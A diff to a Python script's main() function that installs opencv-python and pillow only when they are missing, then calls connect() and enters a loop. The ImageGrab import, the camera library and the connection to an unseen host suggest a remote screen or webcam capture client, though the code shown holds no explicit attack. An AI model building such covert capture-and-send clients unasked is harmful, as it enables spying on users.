@@ -93,8 +93,15 @@ def main():
         import pip
      except ImportError:
         ensurepip.bootstrap()
-     os.system("python -m pip install opencv-python")
-     os.system("python -m pip install pillow")
+     try:
+        import cv2
+     except ImportError:
+        os.system("python -m pip install opencv-python")
+ 
+     try:
+        from PIL import ImageGrab
+     except ImportError:
+        os.system("python -m pip install pillow")
      c,s=connect()
      while True:
         try:
